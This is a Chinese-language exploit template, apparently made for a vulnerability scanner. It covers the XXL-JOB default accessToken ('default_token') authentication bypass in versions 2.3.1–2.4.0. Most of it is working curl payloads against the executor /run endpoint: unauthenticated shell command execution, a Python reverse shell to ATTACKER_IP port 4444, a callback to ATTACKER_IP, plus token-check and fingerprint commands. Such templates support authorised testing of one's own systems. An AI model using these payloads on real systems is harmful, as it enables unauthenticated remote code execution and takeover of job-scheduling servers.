---
id: XXL-JOB-DEFAULT-TOKEN
title: XXL-JOB 默认 accessToken 身份认证绕过漏洞
product: xxl-job
vendor: XXL-JOB
version_affected: "v2.3.1 - v2.4.0"
severity: CRITICAL
tags: [rce, auth_bypass, 无需认证]
fingerprint: ["XXL-JOB", "xxl-job", "任务调度中心"]
---

## 漏洞描述

XXL-JOB 从 v2.3.1 版本开始在配置文件中为 accessToken 设置了默认值 `default_token`。如果用户未修改此默认值，攻击者可使用该默认 Token 绕过 executor 的认证校验，通过 GLUE 模式执行任意系统命令。

## 影响版本

- XXL-JOB v2.3.1 - v2.4.0

## 前置条件

- 无需认证（使用默认 accessToken）
- executor 端口可访问（默认 9999）

## 利用步骤

1. 构造 POST 请求到 executor 的 `/run` 接口
2. 添加 `XXL-JOB-ACCESS-TOKEN: default_token` 头
3. 使用 GLUE 模式（Shell/Python）执行任意命令

## Payload

### GLUE_SHELL 执行命令

```bash
curl -s "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -H "XXL-JOB-ACCESS-TOKEN: default_token" \
  -d '{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "executorBlockStrategy": "COVER_EARLY",
    "executorTimeout": 0,
    "logId": 1,
    "logDateTime": 1586629003729,
    "glueType": "GLUE_SHELL",
    "glueSource": "#!/bin/bash\nid",
    "glueUpdatetime": 1586699003758,
    "broadcastIndex": 0,
    "broadcastTotal": 0
  }'
```

### GLUE_PYTHON 反弹 Shell

```bash
curl -s "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -H "XXL-JOB-ACCESS-TOKEN: default_token" \
  -d '{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "executorBlockStrategy": "COVER_EARLY",
    "executorTimeout": 0,
    "logId": 1,
    "logDateTime": 1586629003729,
    "glueType": "GLUE_PYTHON",
    "glueSource": "import os\nos.system(\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\")",
    "glueUpdatetime": 1586699003758,
    "broadcastIndex": 0,
    "broadcastTotal": 0
  }'
```

### DNS 回调验证

```bash
curl -s "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -H "XXL-JOB-ACCESS-TOKEN: default_token" \
  -d '{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "executorBlockStrategy": "COVER_EARLY",
    "executorTimeout": 0,
    "logId": 1,
    "logDateTime": 1586629003729,
    "glueType": "GLUE_SHELL",
    "glueSource": "#!/bin/bash\ncurl http://ATTACKER_IP/xxljob_rce",
    "glueUpdatetime": 1586699003758,
    "broadcastIndex": 0,
    "broadcastTotal": 0
  }'
```

## 验证方法

```bash
# 不带 Token 发送请求，返回 500 + "The access token is wrong"
# 带默认 Token 发送请求，返回 200 即表明使用了默认 Token
curl -s "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -H "XXL-JOB-ACCESS-TOKEN: default_token" \
  -d '{"jobId":1,"executorHandler":"demoJobHandler","executorParams":"","executorBlockStrategy":"COVER_EARLY","executorTimeout":0,"logId":1,"logDateTime":1586629003729,"glueType":"GLUE_SHELL","glueSource":"#!/bin/bash\necho test","glueUpdatetime":1586699003758,"broadcastIndex":0,"broadcastTotal":0}' \
  -o /dev/null -w "%{http_code}"
```

## 指纹确认

```bash
curl -s "http://target:9999/" | grep -i "xxl-job\|invalid request"
```
